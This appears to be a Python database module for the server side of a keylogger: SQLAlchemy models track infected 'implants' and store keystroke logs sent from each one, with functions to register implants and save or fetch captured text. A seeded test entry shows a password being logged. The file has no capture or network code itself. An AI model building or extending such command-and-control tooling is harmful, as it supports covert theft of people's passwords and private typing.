from sqlalchemy import create_engine
import os
from dotenv import load_dotenv
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, Integer, String, DateTime, Boolean, ForeignKey
from sqlalchemy.sql import func
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

load_dotenv()
POSTGRES_USER = os.getenv('POSTGRES_USER')
POSTGRES_PASSWORD = os.getenv('POSTGRES_PASSWORD')
POSTGRES_DB = os.getenv('POSTGRES_DB')

class Implant(Base):
    __tablename__ = 'implant'
    id = Column(Integer, primary_key=True)
    firstconnected = Column(DateTime, default=func.now())
    isactive = Column(Boolean, default=True)
    
class Keylog(Base):
    __tablename__ = 'keylog'
    id = Column(Integer, primary_key=True)
    text = Column(String)
    implantid = Column(Integer, ForeignKey("implant.id"), nullable=False)
    timestamp = Column(DateTime, default=func.now())
class Database:
    
    def start_db(self):
        postgresql_url = f'postgresql://{POSTGRES_USER}:{POSTGRES_PASSWORD}@localhost:5432/{POSTGRES_DB}'

        self.engine = create_engine(postgresql_url)
        
        self.Session = sessionmaker(bind=self.engine)

        Base.metadata.create_all(self.engine)
        with self.Session() as s:
            test_implant = Implant()
            s.add(test_implant)
            s.commit()
            test_keylog = Keylog(text="Here's my password lol!", implantid=test_implant.id)
            s.add(test_keylog)
            s.commit()
            
        self.get_all_implants()


    def get_all_implants(self):
        with self.Session() as s:
            implants = s.query(Implant).all()
            
            return [{"id": i.id, "firstconnected": i.firstconnected, "isactive": i.isactive} for i in implants]
    
    def get_implant(self, implantid):
        with self.Session() as s:
            # Perform a join between Implant and Keylog tables
            implantid = int(implantid)
            results = (
                s.query(Implant, Keylog)
                .join(Keylog, Implant.id == Keylog.implantid)
                .filter(Keylog.implantid == implantid)
                .all()
            )

            # Process the results to return a list of dictionaries
            keylogs = []
            for _, keylog in results:
                keylogs.append({
                    "id": keylog.id,
                    "text": keylog.text,
                    "timestamp": keylog.timestamp
                })

            return keylogs
    def new_implant(self):
        with self.Session() as s:
            new_implant = Implant()
            s.add(new_implant)
            s.commit()
            return {"id":new_implant.id}
    
    def new_keylog(self, text, implantid):
        with self.Session() as s:
            new_keylog = Keylog(text=text, implantid=implantid)
            s.add(new_keylog)
            s.commit()
            return {"id": new_keylog.id}
